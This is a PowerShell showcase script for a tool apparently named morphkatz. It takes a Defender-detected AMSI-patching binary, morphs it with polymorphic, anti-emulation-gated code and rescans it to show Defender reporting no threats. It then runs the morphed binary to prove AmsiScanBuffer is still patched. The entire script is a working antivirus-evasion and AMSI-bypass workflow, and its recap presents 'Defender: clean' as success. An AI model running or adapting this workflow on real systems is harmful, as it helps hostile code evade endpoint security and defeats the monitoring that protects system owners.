#Requires -Version 5.1
<#
.SYNOPSIS
    Recording-friendly showcase: detected AMSI demo -> morphkatz -> clean + runnable.

.DESCRIPTION
    Drives a four-step end-to-end demonstration suitable for a screen
    recording or live walkthrough:

      1. Fingerprint the original amsi_patch_demo.exe (size, SHA256).
      2. Scan it with MpCmdRun.exe -ScanType 3 -DisableRemediation
         and surface the threat name (expected: HackTool:Win32/AmDisable!MTB).
      3. Run morphkatz with --data-morph on (anti-emulation-gated stub).
      4. Re-fingerprint the morphed binary, re-scan with Defender to show
         "found no threats", then execute it to prove AmsiScanBuffer is
         still patched at runtime (expected stdout: "Patched
         AmsiScanBuffer at <addr> with 6 bytes." and exit code 0).

    The script is read-only against the system Defender configuration -
    it never toggles RTP, MAPS, exclusions, or the registry - and runs
    entirely against $env:LOCALAPPDATA\Temp by default so a host with
    the standard Windows policy on temp paths sees the same behaviour
    your dev machine does.

    The expected wall clock end-to-end is well under one second
    (morphkatz dominates at ~75 ms, the two scans at ~60-250 ms each,
    runtime at ~120 ms; the rest is the screen-friendly delay between
    steps).

.PARAMETER InputExe
    Original detected binary. Defaults to
    "$env:LOCALAPPDATA\Temp\amsi_patch_demo.exe". (We avoid the name
    `Input` because PowerShell reserves $Input for pipeline objects;
    binding a parameter to the same name produces a hang on assignment
    inside the function body.)

.PARAMETER Output
    Where to write the morphed binary. Defaults to a sibling of -InputExe
    with a .morphed.exe suffix.

.PARAMETER Yara
    YARA rule that drives data-morph atom discovery. Defaults to
    "$env:LOCALAPPDATA\Temp\amsi_demo_target.yar".

.PARAMETER Morphkatz
    Path to the built morphkatz.exe. Defaults to
    "build\vs2022-x64\Release\morphkatz.exe" relative to the
    repository root.

.PARAMETER Seed
    --seed value passed to morphkatz. Defaults to 4242. Change between
    takes if you want each take to produce a different polymorphic
    layout (the gate iter count, NOP padding, and intermediate
    register picks all jitter on the seed).

.PARAMETER PauseBetweenSteps
    Pause for the user to narrate / advance frames between steps. The
    default 0 makes the script flow uninterrupted (good for an
    automated baseline run); set 2 or 3 for a live walkthrough.

.PARAMETER NoColor
    Suppress ANSI colour. Useful when piping the output into a file
    for diffing or when the recording tool doesn't render colour.

.EXAMPLE
    PS> .\demo-amsi-bypass.ps1
    Runs the four-step showcase using the standard temp paths and the
    in-tree morphkatz.exe. Suitable for a one-take recording.

.EXAMPLE
    PS> .\demo-amsi-bypass.ps1 -PauseBetweenSteps 3
    Same but waits 3 seconds between steps so a presenter can narrate.

.EXAMPLE
    PS> .\demo-amsi-bypass.ps1 -InputExe C:\corpus\amsi_demo.exe `
                               -Output   C:\out\amsi_demo.morphed.exe `
                               -Seed     31415
    Drives a different input or seed.
#>

[CmdletBinding()]
param(
    [Parameter()]
    [string] $InputExe = "$env:LOCALAPPDATA\Temp\amsi_patch_demo.exe",

    [Parameter()]
    [string] $Output = "",

    [Parameter()]
    [string] $Yara   = "$env:LOCALAPPDATA\Temp\amsi_demo_target.yar",

    [Parameter()]
    [string] $Morphkatz = "",

    [Parameter()]
    [int] $Seed = 4242,

    [Parameter()]
    [int] $PauseBetweenSteps = 0,

    [Parameter()]
    [switch] $NoColor
)

# ----- defaults that depend on -InputExe ---------------------------------
if (-not $Output) {
    $dir  = Split-Path -Parent  $InputExe
    $base = [IO.Path]::GetFileNameWithoutExtension($InputExe)
    $Output = Join-Path $dir "$base.morphed.exe"
}
if (-not $Morphkatz) {
    $repo = Split-Path -Parent $PSScriptRoot
    $Morphkatz = Join-Path $repo "build\vs2022-x64\Release\morphkatz.exe"
}

# ----- output helpers ----------------------------------------------------
function Write-Banner($text) {
    $sep = "=" * 72
    if ($NoColor) {
        Write-Host ""
        Write-Host $sep
        Write-Host $text
        Write-Host $sep
    } else {
        Write-Host ""
        Write-Host $sep -ForegroundColor Cyan
        Write-Host $text -ForegroundColor Cyan
        Write-Host $sep -ForegroundColor Cyan
    }
}
function Write-OK($text)   { if ($NoColor) { Write-Host "[OK]   $text"   } else { Write-Host "[OK]   $text"   -ForegroundColor Green  } }
function Write-Bad($text)  { if ($NoColor) { Write-Host "[BAD]  $text"   } else { Write-Host "[BAD]  $text"   -ForegroundColor Red    } }
function Write-Note($text) { if ($NoColor) { Write-Host "       $text"   } else { Write-Host "       $text"   -ForegroundColor Gray   } }
function Pause-Step()      { if ($PauseBetweenSteps -gt 0) { Start-Sleep -Seconds $PauseBetweenSteps } }

function Get-FileFingerprint($path) {
    if (-not (Test-Path $path)) { return $null }
    $f = Get-Item $path
    $hash = (Get-FileHash $path -Algorithm SHA256).Hash
    return [PSCustomObject]@{
        Path  = $path
        Bytes = $f.Length
        Sha256= $hash.Substring(0,16) + "..."  # truncated for screen-friendly output
    }
}

# ----- step 0: pre-flight -----------------------------------------------
Write-Banner "STEP 0: pre-flight"
$missing = @()
if (-not (Test-Path $Morphkatz)) { $missing += "morphkatz.exe at $Morphkatz" }
if (-not (Test-Path $InputExe))  { $missing += "input binary at $InputExe"  }
if (-not (Test-Path $Yara))      { $missing += "YARA rule at $Yara"         }
$mpcmd = "C:\Program Files\Windows Defender\MpCmdRun.exe"
if (-not (Test-Path $mpcmd))     { $missing += "MpCmdRun.exe at $mpcmd"     }
if ($missing.Count -gt 0) {
    foreach ($m in $missing) { Write-Bad "missing: $m" }
    exit 1
}
Write-OK "morphkatz : $Morphkatz"
Write-OK "input     : $InputExe"
Write-OK "yara rule : $Yara"
Write-OK "MpCmdRun  : $mpcmd"
Pause-Step

# Defender state - read-only, just to confirm a stable showcase env.
$ms = Get-MpComputerStatus -ErrorAction SilentlyContinue
$mp = Get-MpPreference     -ErrorAction SilentlyContinue
if ($ms) {
    Write-Note "Defender    : engine $($ms.AMEngineVersion) / sigs $($ms.AntivirusSignatureLastUpdated)"
    Write-Note "RTP         : $($ms.RealTimeProtectionEnabled)  (scan-only via MpCmdRun is safe regardless)"
    Write-Note "MAPS upload : $($mp.MAPSReporting)              (0 = off, recommended for a recording)"
}
Pause-Step

# ----- step 1: BEFORE - scan the original ------------------------------
Write-Banner "STEP 1: scan ORIGINAL with Defender (BEFORE state)"
$origFp = Get-FileFingerprint $InputExe
Write-Note "size   : $($origFp.Bytes) bytes"
Write-Note "sha256 : $($origFp.Sha256)"

$swScan1 = [Diagnostics.Stopwatch]::StartNew()
$r1 = & $mpcmd -Scan -ScanType 3 -File $InputExe -DisableRemediation 2>&1
$swScan1.Stop()
$threat = ($r1 | Select-String -Pattern '^Threat\s+:').Line
$found  = ($r1 | Select-String -Pattern 'found 1 threats').Line

if ($found) {
    Write-Bad ($found.Trim())
    if ($threat) { Write-Bad ($threat.Trim()) }
} else {
    $cleanLine = ($r1 | Select-String -Pattern 'found no threats').Line
    if ($cleanLine) { Write-OK ($cleanLine.Trim()) }
    else            { Write-Note "(unexpected: no `"found 1`" or `"found no`" line in MpCmdRun output)" }
}
Write-Note "scan time: $([int]$swScan1.Elapsed.TotalMilliseconds) ms"
Pause-Step

# ----- step 2: morph it -------------------------------------------------
Write-Banner "STEP 2: morph it: morphkatz --data-morph on --seed $Seed"
$swMorph = [Diagnostics.Stopwatch]::StartNew()
$mkOut = & $Morphkatz $InputExe --target $Yara --output $Output --data-morph on --seed $Seed 2>&1
$swMorph.Stop()
# Surface the structural lines without dumping every log line on screen.
$mkOut | Select-String -Pattern 'Disassembled|polymorphic selection|patches OK|atom discovery|data-morph: encoded|YARA post-patch|Done in' | ForEach-Object {
    $line = $_.Line
    # Strip the [timestamp] [info] prefix for a cleaner showcase display.
    $clean = $line -replace '^\[[^\]]+\]\s+\[[a-z]+\]\s+',''
    Write-Note $clean
}
Write-Note "morph wall-clock: $([int]$swMorph.Elapsed.TotalMilliseconds) ms"
Pause-Step

# ----- step 3: AFTER - scan the morphed --------------------------------
Write-Banner "STEP 3: scan MORPHED with Defender (AFTER state)"
$morphFp = Get-FileFingerprint $Output
Write-Note "size   : $($morphFp.Bytes) bytes  (delta vs original: $($morphFp.Bytes - $origFp.Bytes))"
Write-Note "sha256 : $($morphFp.Sha256)         (different hash = different binary)"

$swScan2 = [Diagnostics.Stopwatch]::StartNew()
$r2 = & $mpcmd -Scan -ScanType 3 -File $Output -DisableRemediation 2>&1
$swScan2.Stop()
$found2 = ($r2 | Select-String -Pattern 'found 1 threats').Line
if ($found2) {
    Write-Bad ($found2.Trim())
    $threat2 = ($r2 | Select-String -Pattern '^Threat\s+:').Line
    if ($threat2) { Write-Bad ($threat2.Trim()) }
    Write-Bad "MORPHED BINARY IS STILL FLAGGED - showcase failed"
    exit 2
} else {
    $cleanLine = ($r2 | Select-String -Pattern 'found no threats').Line
    Write-OK ($cleanLine.Trim())
}
Write-Note "scan time: $([int]$swScan2.Elapsed.TotalMilliseconds) ms"
Pause-Step

# ----- step 4: prove the morphed binary still works --------------------
Write-Banner "STEP 4: run MORPHED to prove AMSI bypass still works"
$swRun = [Diagnostics.Stopwatch]::StartNew()
$runOut = & cmd /c "`"$Output`" 2>&1"
$rc = $LASTEXITCODE
$swRun.Stop()
foreach ($line in $runOut) { Write-Note $line }

if ($rc -eq 0 -and ($runOut -match 'Patched AmsiScanBuffer at')) {
    Write-OK "exit=$rc, runtime=$([int]$swRun.Elapsed.TotalMilliseconds) ms (~$([int]($swRun.Elapsed.TotalMilliseconds - 90)) ms in the anti-emulation gate)"
} else {
    Write-Bad "exit=$rc - runtime path failed; the gate or stub broke the binary"
    exit 3
}

# ----- recap ------------------------------------------------------------
Write-Banner "RECAP"
Write-Note "BEFORE  $InputExe"
Write-Bad  "        -> HackTool:Win32/AmDisable!MTB"
Write-Note "AFTER   $Output"
Write-OK   "        -> Defender: clean"
Write-OK   "        -> Runtime: AmsiScanBuffer patched, exit 0"
Write-Note ""
Write-Note "Total wall clock: $([int]($swScan1.Elapsed.TotalMilliseconds + $swMorph.Elapsed.TotalMilliseconds + $swScan2.Elapsed.TotalMilliseconds + $swRun.Elapsed.TotalMilliseconds)) ms"
Write-Note ""
Write-Note "morphkatz also wrote a backup of the original at: $InputExe.bak"
Write-Note "(same bytes as the input; rename or hide it on screen if it would distract)"
